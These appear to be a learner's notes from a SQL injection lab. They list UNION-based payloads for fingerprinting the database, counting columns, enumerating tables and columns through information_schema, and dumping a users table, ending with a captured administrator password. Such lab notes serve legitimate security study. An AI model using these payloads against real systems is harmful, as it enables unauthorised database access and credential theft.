# Preliminary Work
    - Test if SQL Injection is possible
        -- idk come back to it 
    - Get the SQL Version
        -- ' UNION SELECT @@version
        -- [Oracle] '+UNION+SELECT+*+FROM+v$version OR '+UNION+SELECT+BANNER+NULL+FROM+v$version
        -- SELECT version()
    - Determine number of columns needed for UNION
        -- ' ORDER BY (number)--
            -- stop when you get an error
        -- ' ORDER BY 3-- yielded error so we know there are 2 columns
            -- ALL tables have 2 columns
    - Determine which columns can handle text (to display juicy info)
        -- ' UNION SELECT 'a',NULL,NULL,...--
            -- some SQL versions use # for comments
        -- ' UNION SELECT 'a',NULL-- ||| ' UNION SELECT 'a','a'-- both worked
            -- both columns support text (good news for username and passwords)

# Looking Through the Database (non-Oracle)
    -- See which tables actually exist
        -- ' UNION SELECT table_name,NULL FROM information_schema.tables--
    -- Look through list of tables in response to find promising stuff
        -- First Try: pg_user
        -- Second Try: user_mappings
        -- Third Try: pg_user_mappings
        -- Fourth Try: pg_user_mapping
        -- Fifth Try: users_rhfkhb
            -- used CTRL-F with "users" to look through response
    -- Get the columns (and data type) from that table
        -- ' UNION SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE table_name = 'pg_user'--
        -- Columns: username_noyyxs | password_eyqvvd
    -- Get data from columns
        -- ' UNION SELECT username_noyyxs,password_eyqvvd FROM users_rhfkhb--
        -- Admin account info:
            uname: administrator
            pword: a6s5xe68qyib407piczf





